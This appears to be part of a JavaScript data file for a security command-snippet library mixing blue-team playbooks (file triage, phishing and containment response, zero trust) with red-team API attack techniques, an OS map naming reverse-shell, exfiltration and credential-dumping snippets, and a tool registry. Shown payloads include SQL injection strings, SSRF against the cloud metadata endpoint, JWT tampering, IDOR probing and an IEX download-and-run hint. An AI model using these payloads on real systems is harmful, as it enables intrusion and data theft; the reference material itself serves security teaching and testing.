      tags: ['triage', 'strings', 'pe-analysis', 'virustotal', 'pestudio'],
      commands: {
        linux: '# FILE TRIAGE (Linux)\n\n# Hash the sample\nsha256sum suspicious.exe\nmd5sum suspicious.exe\n\n# Check VirusTotal\ncurl -s "https://www.virustotal.com/api/v3/files/$(sha256sum suspicious.exe | cut -d\\  -f1)" -H "x-apikey: $VT_API_KEY"\n\n# Extract strings\nstrings -a -n 6 suspicious.exe | sort -u\nfloss suspicious.exe  # FLARE FLOSS for obfuscated strings\n\n# PE analysis\npython3 -c "import pefile; pe=pefile.PE(\\"suspicious.exe\\"); print(pe.dump_info())"\n\n# Check for packers\ndie suspicious.exe  # Detect It Easy\nexiftool suspicious.exe',
        windows: '# FILE TRIAGE (Windows)\n\n# Hash the sample\nGet-FileHash suspicious.exe -Algorithm SHA256\nGet-FileHash suspicious.exe -Algorithm MD5\n\n# PEStudio: drag-and-drop GUI analysis\n# Shows imports, sections, strings, indicators\n\n# Sigcheck (Sysinternals)\nsigcheck -e -u suspicious.exe\n\n# Strings extraction\nstrings.exe -accepteula -n 6 suspicious.exe\nfloss.exe suspicious.exe' },
      killchain: 'defense', attack: ['execution'], pyramid: 'hashes', owasp: [] },

    // --- Incident Playbooks (blue) ---
    { id: 'ir-triage', title: 'Incident Triage Workflow', team: 'blue', category: 'irplaybook',
      description: 'Structured SOC alert triage: intake, context validation, IOC checks, and escalation decision.',
      tags: ['incident-response', 'triage', 'soc', 'alert', 'sla'],
      command: '# INCIDENT TRIAGE WORKFLOW\n\n# 1. INTAKE (< 5 min)\n# - Claim alert, set status = In Progress\n# - Note: Alert Time, Event Time, Severity, Asset, User\n# - Check SLA: Critical=15min, High=30min, Medium=4h, Low=1day\n\n# 2. CONTEXT & VALIDATION (< 10 min)\n# - Read alert description and rule logic\n# - Inspect fields: user, host, IP, command, mail headers\n# - Check timeline in SIEM (+/- 1 hour)\n# - Cross-check: change windows, jump boxes, VPN locations\n\n# 3. IOC & TI CHECKS\n# - IP/URL/Hash -> VirusTotal, GreyNoise, Shodan\n# - User/Host history: normal login locations, prior alerts\n# - ATT&CK mapping: which tactic/technique?\n\n# 4. DECISION POINT\n# Score 0-2 on: Asset criticality, Legitimacy, Blast radius, Repeatability\n# >= 6: Escalate/Contain NOW\n# 3-5: Deep triage\n# <= 2: Likely FP, document and close\n\n# 5. VERDICT\n# True Positive -> Containment\n# False Positive -> Document root cause, tune rule\n# Benign True -> Lessons learned, close',
      killchain: 'defense', attack: ['initial-access', 'persistence', 'defense-evasion'], pyramid: 'ttps', owasp: [] },

    { id: 'ir-contain-playbook', title: 'Containment Actions Playbook', team: 'blue', category: 'irplaybook',
      description: 'Containment response actions: identity, endpoint, network, mail, and cloud isolation.',
      tags: ['incident-response', 'containment', 'edr', 'isolation'],
      command: '# CONTAINMENT ACTIONS\n\n# IDENTITY\n# - Reset password, force MFA re-enrollment\n# - Revoke refresh tokens, sign out all sessions\naz ad user update --id USER --force-change-password-next-sign-in true\nRevoke-AzureADUserAllRefreshToken -ObjectId USER_OID\n\n# ENDPOINT\n# - EDR: isolate host from network\n# - Kill m_alicious process, quarantine file\n# - Collect forensic triage package\n\n# NETWORK\n# - Block IP/URL/domain at firewall/SWG\n# - Network segmentation of affected VLAN\n# - Sinkhole m_alicious DNS\n\n# MAIL\n# - Retract phishing campaign tenant-wide\n# - Block sender/domain\n# - Purge messages from all mailboxes\nSearch-Mailbox -Identity ALL -SearchQuery "from:attacker@evil.com" -DeleteContent\n\n# CLOUD\n# - Revoke OAuth consent grants\n# - Disable suspicious app registration\n# - Review conditional access policies',
      killchain: 'defense', attack: ['impact'], pyramid: 'ttps', owasp: [] },

    { id: 'ir-phishing', title: 'Phishing Response Playbook', team: 'blue', category: 'irplaybook',
      description: 'End-to-end phishing incident handling: header analysis, link detonation, campaign scoping, and remediation.',
      tags: ['phishing', 'email', 'incident-response', 'headers', 'dmarc'],
      command: '# PHISHING RESPONSE PLAYBOOK\n\n# 1. ANALYZE HEADERS\n# Check SPF, DKIM, DMARC results\n# Verify Return-Path vs From header\n# Check X-Originating-IP and relay chain\n\n# 2. ANALYZE CONTENT\n# - Extract and defang URLs: hxxps://evil[.]com\n# - Submit links to urlscan.io\n# - Hash attachments and check VirusTotal\n# - Detonate in sandbox (ANY.RUN, Joe Sandbox)\n\n# 3. SCOPE THE CAMPAIGN\n# Search for similar messages in tenant\n# Same sender, subject, attachment hash\n# How many users received? How many clicked?\n\n# 4. CONTAIN\n# Block sender domain\n# Purge messages tenant-wide\n# Reset passwords for users who clicked/submitted credentials\n# Revoke active sessions\n\n# 5. DOCUMENT\n# IOCs: sender, URLs, hashes, IPs\n# Timeline of events\n# Number affected\n# Lessons learned and rule tuning',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'domains', owasp: [] },

    // --- API Security (purple) ---
    { id: 'apisec-recon', title: 'API Reconnaissance', team: 'red', category: 'apisec',
      description: 'Discover and enumerate API endpoints, documentation, and authentication mechanisms.',
      tags: ['api', 'swagger', 'openapi', 'reconnaissance'],
      command: '# API RECONNAISSANCE\n\n# Discover API documentation\n# Common paths to check:\n# /api, /api/v1, /swagger, /swagger-ui, /openapi.json\n# /api-docs, /graphql, /.well-known/openapi.yaml\n# /v1/docs, /v2/docs, /redoc\n\n# Enumerate endpoints from docs\ncurl -s TARGET/openapi.json | jq ".paths | keys[]"\ncurl -s TARGET/swagger.json | jq ".paths | keys[]"\n\n# Fuzz for hidden endpoints\nffuf -u TARGET/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt -mc 200,201,401,403\n\n# GraphQL introspection\ncurl -s -X POST TARGET/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name,fields{name}}}}"}\'  \n\n# Check for API versioning\n# /api/v1/ vs /api/v2/ (older versions may lack auth)\n\n# Postman collection discovery\ncurl -s TARGET/postman-collection.json',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: ['A01'] },

    { id: 'apisec-auth-bypass', title: 'API Authentication Bypass', team: 'red', category: 'apisec',
      description: 'Test API authentication flaws: BOLA/IDOR, broken auth, JWT attacks, and rate limiting.',
      tags: ['api', 'bola', 'idor', 'jwt', 'authentication'],
      command: '# API AUTH BYPASS TECHNIQUES\n\n# BOLA/IDOR (Broken Object Level Auth)\n# Change resource IDs in requests\nGET /api/v1/users/1001/profile  # your profile\nGET /api/v1/users/1002/profile  # someone else?\nGET /api/v1/orders/AAAA-0001    # your order\nGET /api/v1/orders/AAAA-0002    # another order?\n\n# JWT ATTACKS\n# Decode token\necho "eyJ..." | base64 -d\n# Change algorithm to none\n# Change role claim: "role":"admin"\n# Crack weak signing key\nhashcat -m 16500 jwt.txt wordlist.txt\n\n# BROKEN FUNCTION LEVEL AUTH\nGET /api/v1/users        # regular endpoint\nGET /api/admin/users     # admin endpoint, same token?\nDELETE /api/v1/users/1   # method not checked?\n\n# RATE LIMIT BYPASS\n# X-Forwarded-For: 127.0.0.1\n# X-Real-IP: varies\n# Rotate API keys\n# Add null bytes or URL encoding',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01'] },

    { id: 'apisec-injection', title: 'API Injection & Mass Assignment', team: 'red', category: 'apisec',
      description: 'Test APIs for injection flaws, mass assignment, and excessive data exposure.',
      tags: ['api', 'injection', 'mass-assignment', 'ssrf', 'graphql'],
      command: '# API INJECTION & DATA FLAWS\n\n# MASS ASSIGNMENT\n# Add extra fields to update requests\nPUT /api/v1/users/me\n{"name":"test","role":"admin","is_admin":true,"balance":999}\n\n# EXCESSIVE DATA EXPOSURE\n# Check if API returns more data than UI shows\nGET /api/v1/users/me  # returns password_hash, SSN, internal_id?\n\n# SQL INJECTION via API\nGET /api/v1/search?q=test\'OR\'1\'=\'1\nPOST /api/v1/login {"user":"admin\'--","pass":"x"}\n\n# SSRF via API parameters\nPOST /api/v1/fetch {"url":"http://169.254.169.254/latest/meta-data/"}\nPOST /api/v1/webhook {"callback":"http://internal-service:8080/admin"}\n\n# GRAPHQL INJECTION\n# Nested queries (resource exhaustion)\n{users{friends{friends{friends{name}}}}}\n# Batch queries\n[{"query":"..."}, {"query":"..."}, ...]',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A03'] },

    // --- Zero Trust (blue) ---
    { id: 'zt-architecture', title: 'Zero Trust Architecture', team: 'blue', category: 'zerotrust',
      description: 'Zero Trust principles and architecture: never trust, always verify. Identity, device, network, and data controls.',
      tags: ['zero-trust', 'architecture', 'nist-800-207', 'identity'],
      command: '# ZERO TRUST ARCHITECTURE\n\n# CORE PRINCIPLES (NIST SP 800-207)\n# 1. All data sources and computing services are resources\n# 2. All communication is secured regardless of location\n# 3. Access to individual resources is granted per-session\n# 4. Access determined by dynamic policy (identity, device, behavior)\n# 5. Monitor and measure integrity/security of all assets\n# 6. Authentication and authorization are dynamic and strictly enforced\n# 7. Collect as much info as possible for improving security posture\n\n# PILLARS\n# - Identity: Strong auth (MFA, passwordless, conditional access)\n# - Device: Health attestation, compliance checks, MDM/MAM\n# - Network: Microsegmentation, encrypted transport, no implicit trust\n# - Application: Least privilege, API gateways, WAF\n# - Data: Classification, encryption at rest/transit, DLP\n# - Visibility: SIEM, UEBA, continuous monitoring\n\n# MATURITY MODEL\n# Traditional -> Advanced -> Optimal\n# Start with identity and critical assets\n# Then expand to network and data controls',
      killchain: 'defense', attack: ['initial-access', 'persistence', 'defense-evasion'], pyramid: 'ttps', owasp: [] },

    { id: 'zt-identity', title: 'Zero Trust Identity Controls', team: 'blue', category: 'zerotrust',
      description: 'Implement Zero Trust identity: conditional access, MFA enforcement, token lifecycle, and RBAC/ABAC.',
      tags: ['zero-trust', 'identity', 'conditional-access', 'mfa', 'rbac'],
      commands: {
        linux: '# ZERO TRUST IDENTITY (Linux/Cloud)\n\n# Azure AD Conditional Access (CLI)\naz ad conditional-access policy list -o table\n\n# Enforce MFA for all users\n# Conditional Access: Require MFA for all cloud apps\n# Block legacy authentication protocols\n# Require compliant/hybrid joined device\n\n# Token lifecycle\n# Access tokens: short-lived (1 hour)\n# Refresh tokens: revocable, conditional\n# Continuous Access Evaluation (CAE)\n\n# RBAC audit\naz role assignment list --output table\naz role assignment list --assignee USER@domain.com\n\n# Service principal review\naz ad sp list --filter "servicePrincipalType eq \'Application\'" --query "[].{Name:displayName,AppId:appId}" -o table',
        windows: '# ZERO TRUST IDENTITY (Windows/PowerShell)\n\n# Conditional Access policies\nGet-AzureADMSConditionalAccessPolicy | Select DisplayName, State\n\n# MFA status check\nGet-MsolUser -All | Where {$_.StrongAuthenticationRequirements.Count -eq 0} | Select UserPrincipalName\n\n# Block legacy auth\n# Conditional Access -> Conditions -> Client apps -> Block Exchange ActiveSync, Other clients\n\n# Review app registrations and permissions\nGet-AzureADApplication | Select DisplayName, AppId\nGet-AzureADServiceAppRoleAssignment -ObjectId $spId\n\n# Token revocation\nRevoke-AzureADUserAllRefreshToken -ObjectId $userId' },
      killchain: 'defense', attack: ['initial-access', 'persistence', 'defense-evasion'], pyramid: 'ttps', owasp: [] },

    { id: 'zt-network', title: 'Zero Trust Network Segmentation', team: 'blue', category: 'zerotrust',
      description: 'Implement microsegmentation, SDP, and network-level Zero Trust controls.',
      tags: ['zero-trust', 'microsegmentation', 'sdp', 'firewall', 'network'],
      command: '# ZERO TRUST NETWORK\n\n# MICROSEGMENTATION\n# Define security zones per workload\n# Default deny between all zones\n# Allow only explicitly required flows\n\n# Firewall rules (iptables example)\n# Default deny all\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT DROP\n# Allow only specific flows\niptables -A INPUT -s 10.1.1.0/24 -d 10.2.1.10 -p tcp --dport 443 -j ACCEPT\n\n# Software-Defined Perimeter (SDP)\n# - No visible network surface\n# - Single Packet Authorization (SPA)\n# - Mutual TLS between client and gateway\n# - Per-session, per-resource access\n\n# VERIFICATION\n# Scan for unexpected open ports\nnmap -sS -p- --min-rate 1000 SEGMENT_RANGE\n# Check for lateral movement paths\n# Verify east-west traffic is encrypted\n# Monitor for policy violations in SIEM\n\n# CLOUD (Azure NSG/AWS SG)\naz network nsg rule list --nsg-name MY_NSG -g MY_RG -o table\naws ec2 describe-security-groups --output table',
      killchain: 'defense', attack: ['lateral-movement'], pyramid: 'artifacts', owasp: [] },

    { id: 'zt-assessment', title: 'Zero Trust Maturity Assessment', team: 'blue', category: 'zerotrust',
      description: 'Assess organizational Zero Trust maturity across all pillars with gap analysis and roadmap.',
      tags: ['zero-trust', 'assessment', 'maturity', 'gap-analysis', 'cisa'],
      command: '# ZERO TRUST MATURITY ASSESSMENT\n\n# CISA Zero Trust Maturity Model Pillars:\n# Score each 1-5 (Traditional -> Optimal)\n\n# 1. IDENTITY\n# [ ] MFA enforced for all users?\n# [ ] Passwordless authentication available?\n# [ ] Conditional access policies active?\n# [ ] Legacy auth protocols blocked?\n# [ ] Privileged access managed (PAM)?\n\n# 2. DEVICES\n# [ ] Device health attestation required?\n# [ ] MDM/MAM enrolled and compliant?\n# [ ] Endpoint detection and response (EDR)?\n# [ ] Unmanaged devices restricted?\n\n# 3. NETWORKS\n# [ ] Microsegmentation implemented?\n# [ ] East-west traffic encrypted?\n# [ ] DNS filtering active?\n# [ ] Network access requires identity?\n\n# 4. APPLICATIONS\n# [ ] Least privilege access (RBAC/ABAC)?\n# [ ] API gateway with auth?\n# [ ] WAF protecting web apps?\n# [ ] SaaS access via CASB/ZTNA?\n\n# 5. DATA\n# [ ] Data classified and labeled?\n# [ ] Encryption at rest and in transit?\n# [ ] DLP policies active?\n# [ ] Backup and recovery tested?\n\n# 6. VISIBILITY\n# [ ] Centralized logging (SIEM)?\n# [ ] UEBA for anomaly detection?\n# [ ] Automated response (SOAR)?\n# [ ] Regular posture assessments?',
      killchain: 'defense', attack: ['initial-access', 'persistence', 'defense-evasion'], pyramid: 'ttps', owasp: [] },
  ];

  // ═══════════════════════════════════════════════════════════
  //  OS TAGGING — maps snippet id → target OS
  // ═══════════════════════════════════════════════════════════

  const OS_MAP = {
    // Linux-only commands (run ON Linux target or Linux-specific tools)
    'bash-rev': 'linux', 'nc-rev': 'linux', 'python-rev': 'linux',
    'tty-upgrade': 'linux', 'linpeas': 'linux', 'sudo-l': 'linux',
    'find-suid': 'linux', 'persist-cron': 'linux', 'persist-service': 'linux',
    'download-http': 'linux', 'exfil-nc': 'linux', 'exfil-base64': 'linux',
    'netstat-linux': 'linux', 'find-creds': 'linux',
    'ir-collect-linux': 'linux', 'virustotal-hash': 'linux', 'remnux-analysis': 'linux',
    'blue-fw-rules': 'linux', 'blue-fail2ban': 'linux', 'blue-auth-logs': 'linux',
    'blue-process-audit': 'linux', 'blue-cron-audit': 'linux', 'blue-svc-audit': 'linux',
    'blue-network-connections': 'linux', 'blue-dns-monitor': 'linux',
    'blue-hash-check': 'linux', 'blue-user-audit': 'linux',
    'listener-rlwrap': 'linux', 'ldapsearch': 'linux',
    // Receivers (mostly cross-platform, some Linux)
    'dns-listener': 'linux', 'smtp-receiver': 'linux',
    'responder-http': 'linux',
    // Wireless (Linux — needs monitor mode)
    'airmon-start': 'linux', 'airodump': 'linux', 'aireplay-deauth': 'linux',
    'bettercap-wifi': 'linux', 'wifite': 'linux', 'eaphammer': 'linux',
    // Windows-only commands (run ON Windows target or Windows-specific)
    'powershell-rev': 'windows', 'winpeas': 'windows',
    'persist-schtask': 'windows', 'upload-certutil': 'windows',
    'upload-powershell': 'windows', 'netstat-windows': 'windows',
    'ir-collect-windows': 'windows', 'mimikatz-logonpasswords': 'windows',
    'blue-schtask-audit': 'windows', 'blue-windows-events': 'windows',
    // Windows post-exploitation
    'win-sysinfo': 'windows', 'win-powerview': 'windows', 'win-rubeus': 'windows',
    'win-sharphound': 'windows', 'win-token-impersonate': 'windows',
    'win-sam-dump': 'windows', 'win-dpapi': 'windows',
    'win-amsi-bypass': 'windows', 'win-uac-bypass': 'windows',
    // Mobile (mostly cross-platform tools, ADB = Linux/Mac primary)
    'adb-devices': 'linux', 'adb-shell': 'linux',
    // New privesc (Linux)
    'linux-capabilities': 'linux', 'writable-path': 'linux', 'pspy': 'linux', 'gtfobins-check': 'linux',
    // New privesc (Windows)
    'win-token-priv': 'windows', 'unquoted-svc': 'windows', 'always-install-elevated': 'windows', 'dll-hijack-search': 'windows',
    // New persist (Linux)
    'persist-ssh-key': 'linux', 'persist-bashrc': 'linux',
    // New persist (Windows)
    'persist-run-key': 'windows', 'persist-winlogon': 'windows', 'persist-startup-folder': 'windows',
    // New shells (Linux)
    'php-rev': 'linux', 'ruby-rev': 'linux', 'perl-rev': 'linux', 'php-webshell': 'linux', 'socat-encrypted': 'linux',
    // New enum (Linux)
    'world-writable': 'linux', 'recent-files': 'linux', 'docker-enum': 'linux',
    // New forensics (Linux)
    'disk-image-mount': 'linux', 'log2timeline': 'linux',
    // New forensics (Windows)
    'prefetch-parser': 'windows', 'chainsaw-evtx': 'windows',
    // New IR (Linux)
    'ir-containment': 'linux', 'ir-timeline-linux': 'linux',
    // New IR (Windows)
    'ir-timeline-windows': 'windows',
    // New detect (Windows)
    'blue-sysmon-config': 'windows',
    // New detect (Linux)
    'blue-auditd-config': 'linux',
    // New hardening (Linux)
    'blue-lynis': 'linux', 'blue-fail2ban-hardening': 'linux',
    // Social (Linux tools)
    'wifi-evil-twin': 'linux', 'responder-ntlm': 'linux',
    // Post-exploitation (Linux)
    'post-pivot-scan': 'linux',
    // Passwords (Linux tools)
    'cewl-wordlist': 'linux',
    // Wireless defense (Linux)
    'blue-wireless-scan': 'linux', 'blue-wireless-ids': 'linux',
    // Evasion (OS-specific)
    'ev-etw-patch': 'windows', 'ev-process-inject': 'linux',
    // Detect (Linux tools)
    'blue-honeypot': 'linux', 'blue-zeek-monitor': 'linux', 'blue-crowdsec': 'linux',
    // Database (Linux-specific)
    'redis-exploit': 'linux',
    // Docker (Linux-specific)
    'docker-cap-audit': 'linux', 'docker-secrets-extract': 'linux',
    // Setup (Linux/Kali)
    'kali-gui-xrdp': 'linux', 'kali-tools-meta': 'linux', 'kali-full-install': 'linux',
    'kali-pimp-script': 'linux', 'kali-ad-toolkit': 'linux', 'pentest-env-verify': 'linux',
    // Setup (Windows-specific)
    'kali-wsl2-install': 'windows',
    // Network analysis (Linux)
    'tcpdump-capture': 'linux', 'tcpdump-flags': 'linux',
    // C2 (Linux)
    'empire-setup': 'linux', 'empire-post-exploit': 'linux',
    'sliver-c2': 'linux', 'metasploit-handler': 'linux',
    // Tunneling (Linux)
    'ssh-local-forward': 'linux', 'ssh-dynamic-socks': 'linux',
    'ssh-reverse-tunnel': 'linux', 'ssh-jump-bastion': 'linux',
    'ligolo-pivot': 'linux', 'rpivot-socks': 'linux',
    // Stego (Linux)
    'steghide-ops': 'linux', 'binwalk-extract': 'linux',
    // PowerShell (Windows)
    'ps-recon': 'windows', 'ps-download-cradle': 'windows',
    'ps-amsi-bypass': 'windows', 'ps-scriptblock-logging': 'windows',
    // SIEM (mixed — Splunk/ELK are cross-platform, syslog is Linux)
    'syslog-analysis': 'linux',
    'windows-eventids': 'windows',
    // Encoding (encoding-cli and hash-operations have multi-OS commands objects)
    'xor-analysis': 'linux',
    // Phishing (gophish + infra Linux, payloads mostly Windows)
    'gophish-campaign': 'linux', 'phishing-infra': 'linux',
    'phishing-payloads': 'windows',
    // Binary exploitation (Linux-focused)
    'bof-basics': 'linux', 'pwntools-template': 'linux',
    'gdb-peda': 'linux', 'checksec-protections': 'linux',
    'format-string': 'linux',
    // Reverse engineering (Linux-focused)
    'radare2-basics': 'linux', 're-strings-analysis': 'linux',
    're-dynamic-analysis': 'linux', 're-patching': 'linux',
    // Lateral movement (Windows-focused, some have multi-OS commands)
    'lateral-pth': 'windows', 'lateral-rdp': 'windows',
    'lateral-detection': 'windows',
    // Windows forensics
    'volatility-memdump': 'linux', 'registry-forensics': 'windows',
    'memory-acquisition': 'windows', 'prefetch-timeline': 'windows',
    // Reporting (cross-platform)
    'evidence-collection': 'linux',
    // Network attacks (Linux tools)
    'arp-spoof': 'linux', 'dns-attacks': 'linux', 'vlan-hopping': 'linux',
    'responder-relay': 'linux', 'network-sniff': 'linux',
    // AD attacks (mixed — kerberoast/asrep/bloodhound have multi-OS)
    'dcsync': 'windows', 'golden-silver-ticket': 'windows',
    // WAF bypass (cross-platform)
    'waf-detect': 'linux',
    // Automation (bash-oneliners, python-pentest, expect = Linux; cron has multi-OS)
    'bash-oneliners': 'linux', 'python-pentest': 'linux',
    'expect-automation': 'linux', 'regex-security': 'linux',
    // OSINT (cross-platform except opsec tools)
    'osint-opsec': 'linux',
    // Pivoting
    'pivot-ssh-advanced': 'linux', 'pivot-chisel': 'linux',
    'pivot-windows': 'windows', 'pivot-detection': 'linux',
    // ICS/SCADA (mostly Linux recon tools, assessment is cross-platform)
    'ics-recon': 'linux', 'ics-exploit': 'linux',
    'ics-defense': 'linux', 'ics-honeypot': 'linux',
    // Browser exploitation (BeEF Linux, creds/forensics have multi-OS)
    'beef-xss': 'linux',
    // Playbooks (mostly cross-platform; insider has Windows audit commands)
    'playbook-ransomware': 'linux', 'playbook-phishing': 'linux',
    'evidence-collection-playbook': 'linux',
    // Metasploit (Linux attack platform)
    'msf-basics': 'linux', 'msf-handler': 'linux',
    'msf-scanning': 'linux', 'msf-post': 'linux',
    // Azure (auth attacks = Windows; rest = cross-platform)
    'azure-auth-attack': 'windows', 'azure-post-exploit': 'windows',
    // Windows Events (Sysmon/Security = Windows; Splunk/hunting = Linux)
    'winevents-security': 'windows', 'winevents-sysmon': 'windows',
    'winevents-splunk': 'linux', 'winevents-powershell': 'windows',
    'winevents-hunting': 'linux',
    // OPSEC (infra = Linux; detection-evasion = Windows)
    'opsec-infra': 'linux', 'opsec-detection-evasion': 'windows',
    // Sliver C2 (Linux-focused server)
    'sliver-basics': 'linux', 'sliver-post': 'linux',
    // Supply chain (attack tooling Linux; scan is multi-OS)
    'supply-chain-attack': 'linux',
    // Fuzzing (Linux-focused tooling)
    'fuzz-web': 'linux', 'fuzz-binary': 'linux', 'fuzz-api': 'linux',
    // Zero Trust (network segmentation = Linux iptables focused)
    'zt-network': 'linux',
  };

  SNIPPETS.forEach(s => { s.os = OS_MAP[s.id] || 'all'; });

  // ═══════════════════════════════════════════════════════════
  //  TOOL REGISTRY — canonical tool list with install hints
  // ═══════════════════════════════════════════════════════════

  const TOOL_REGISTRY = [
    // Recon
    { id: 'nmap',           label: 'Nmap',              cat: 'recon',     install: 'apt install nmap / choco install nmap / brew install nmap' },
    { id: 'whatweb',        label: 'WhatWeb',            cat: 'recon',     install: 'apt install whatweb / gem install whatweb' },
    { id: 'amass',          label: 'Amass',              cat: 'recon',     install: 'go install github.com/owasp-amass/amass/v4/...@master' },
    { id: 'subfinder',      label: 'Subfinder',          cat: 'recon',     install: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest' },
    { id: 'theharvester',   label: 'theHarvester',       cat: 'recon',     install: 'pip install theHarvester' },
    { id: 'shodan',         label: 'Shodan CLI',         cat: 'recon',     install: 'pip install shodan' },
    { id: 'nuclei',         label: 'Nuclei',             cat: 'recon',     install: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest' },
    // Web
    { id: 'ffuf',           label: 'ffuf',               cat: 'web',       install: 'go install github.com/ffuf/ffuf/v2@latest' },
    { id: 'gobuster',       label: 'Gobuster',           cat: 'web',       install: 'go install github.com/OJ/gobuster/v3@latest' },
    { id: 'feroxbuster',    label: 'Feroxbuster',        cat: 'web',       install: 'apt install feroxbuster / cargo install feroxbuster' },
    { id: 'nikto',          label: 'Nikto',              cat: 'web',       install: 'apt install nikto' },
    { id: 'sqlmap',         label: 'SQLMap',             cat: 'web',       install: 'apt install sqlmap / pip install sqlmap' },
    { id: 'wfuzz',          label: 'Wfuzz',              cat: 'web',       install: 'pip install wfuzz' },
    { id: 'wpscan',         label: 'WPScan',             cat: 'web',       install: 'gem install wpscan' },
    // Passwords
    { id: 'hydra',          label: 'Hydra',              cat: 'passwords', install: 'apt install hydra' },
    { id: 'hashcat',        label: 'Hashcat',            cat: 'passwords', install: 'apt install hashcat / choco install hashcat' },
    { id: 'john',           label: 'John the Ripper',    cat: 'passwords', install: 'apt install john' },
    { id: 'crackmapexec',   label: 'CrackMapExec',       cat: 'passwords', install: 'pip install crackmapexec' },
    // AD / Lateral
    { id: 'bloodhound',     label: 'BloodHound',         cat: 'ad',        install: 'pip install bloodhound' },
    { id: 'impacket',       label: 'Impacket',           cat: 'ad',        install: 'pip install impacket' },
    { id: 'evil-winrm',     label: 'Evil-WinRM',         cat: 'ad',        install: 'gem install evil-winrm' },
    { id: 'kerbrute',       label: 'Kerbrute',           cat: 'ad',        install: 'go install github.com/ropnop/kerbrute@latest' },
    { id: 'enum4linux',     label: 'Enum4Linux-ng',      cat: 'ad',        install: 'pip install enum4linux-ng' },
    { id: 'responder',      label: 'Responder',          cat: 'ad',        install: 'apt install responder / pip install Responder' },
    { id: 'mimikatz',       label: 'Mimikatz',           cat: 'ad',        install: 'Download from github.com/gentilkiwi/mimikatz' },
    // Tunneling
    { id: 'chisel',         label: 'Chisel',             cat: 'tunnel',    install: 'go install github.com/jpillora/chisel@latest' },
    { id: 'socat',          label: 'Socat',              cat: 'tunnel',    install: 'apt install socat' },
    { id: 'ligolo',         label: 'Ligolo-ng',          cat: 'tunnel',    install: 'go install github.com/nicocha30/ligolo-ng@latest' },
    // Payloads
    { id: 'msfvenom',       label: 'Msfvenom',           cat: 'payloads',  install: 'apt install metasploit-framework' },
    { id: 'metasploit',     label: 'Metasploit',         cat: 'payloads',  install: 'apt install metasploit-framework' },
    // Forensics / Blue
    { id: 'volatility',     label: 'Volatility 3',       cat: 'forensics', install: 'pip install volatility3' },
    { id: 'autopsy',        label: 'Autopsy / TSK',      cat: 'forensics', install: 'apt install sleuthkit' },
    { id: 'yara',           label: 'YARA',               cat: 'malware',   install: 'apt install yara / pip install yara-python' },
    { id: 'cuckoo',         label: 'Cuckoo Sandbox',     cat: 'malware',   install: 'pip install cuckoo' },
    // OSINT
    { id: 'recon-ng',       label: 'Recon-ng',           cat: 'osint',     install: 'pip install recon-ng' },
    { id: 'spiderfoot',     label: 'SpiderFoot',         cat: 'osint',     install: 'pip install spiderfoot' },
    { id: 'maltego',        label: 'Maltego CE',         cat: 'osint',     install: 'Download from maltego.com' },
    { id: 'dnsenum',        label: 'DNSenum',            cat: 'osint',     install: 'apt install dnsenum' },
    // Hardening / DAST
    { id: 'semgrep',        label: 'Semgrep',            cat: 'hardening', install: 'pip install semgrep' },
    { id: 'trivy',          label: 'Trivy',              cat: 'hardening', install: 'apt install trivy / brew install trivy' },
    { id: 'zap',            label: 'OWASP ZAP',          cat: 'hardening', install: 'Download from zaproxy.org / docker pull zaproxy/zap-stable' },
    { id: 'dependency-check', label: 'Dep-Check',        cat: 'hardening', install: 'Download from owasp.org/dependency-check' },
    // Cloud
    { id: 'aws',            label: 'AWS CLI',            cat: 'cloud',     install: 'pip install awscli / brew install awscli' },
    { id: 'prowler',        label: 'Prowler',            cat: 'cloud',     install: 'pip install prowler' },
    { id: 'scoutsuite',     label: 'ScoutSuite',         cat: 'cloud',     install: 'pip install scoutsuite' },
    { id: 'pacu',           label: 'Pacu (AWS exploit)', cat: 'cloud',     install: 'pip install pacu' },
    // Wireless
    { id: 'aircrack-ng',    label: 'Aircrack-ng Suite',  cat: 'wireless',  install: 'apt install aircrack-ng' },
    { id: 'bettercap',      label: 'Bettercap',          cat: 'wireless',  install: 'apt install bettercap / brew install bettercap' },
    { id: 'wifite',         label: 'Wifite',             cat: 'wireless',  install: 'apt install wifite' },
    { id: 'eaphammer',      label: 'EAPHammer',          cat: 'wireless',  install: 'github.com/s0lst1c3/eaphammer' },
    // Social Engineering
    { id: 'gophish',        label: 'GoPhish',            cat: 'social',    install: 'github.com/gophish/gophish/releases' },
    { id: 'setoolkit',      label: 'SET Toolkit',        cat: 'social',    install: 'apt install set' },
    { id: 'evilginx',       label: 'Evilginx2',         cat: 'social',    install: 'go install github.com/kgretzky/evilginx2@latest' },
    { id: 'swaks',          label: 'Swaks',              cat: 'social',    install: 'apt install swaks' },
    // Windows Post-Exploit
    { id: 'rubeus',         label: 'Rubeus',             cat: 'winpost',   install: 'github.com/GhostPack/Rubeus (compile)' },
    { id: 'sharphound',     label: 'SharpHound',         cat: 'winpost',   install: 'github.com/BloodHoundAD/SharpHound' },
    { id: 'powerview',      label: 'PowerView',          cat: 'winpost',   install: 'IEX(IWR .../PowerView.ps1)' },
    // Receivers
    { id: 'updog',          label: 'Updog',              cat: 'receivers', install: 'pip install updog' },
    { id: 'interactsh',     label: 'Interactsh',         cat: 'receivers', install: 'go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest' },
    { id: 'ngrok',          label: 'Ngrok',              cat: 'receivers', install: 'Download from ngrok.com / snap install ngrok' },
    { id: 'webdav',         label: 'WsgiDAV',            cat: 'receivers', install: 'pip install wsgidav cheroot' },
    { id: 'dnscat2',        label: 'dnscat2',            cat: 'receivers', install: 'gem install dnscat2 / github.com/iagox86/dnscat2' },
    // Mobile
    { id: 'adb',            label: 'ADB',                cat: 'mobile',    install: 'apt install adb / brew install android-platform-tools' },
    { id: 'apktool',        label: 'Apktool',            cat: 'mobile',    install: 'apt install apktool / brew install apktool' },
    { id: 'jadx',           label: 'JADX',               cat: 'mobile',    install: 'github.com/skylot/jadx/releases' },
    { id: 'frida',          label: 'Frida',              cat: 'mobile',    install: 'pip install frida-tools' },
    { id: 'objection',      label: 'Objection',          cat: 'mobile',    install: 'pip install objection' },
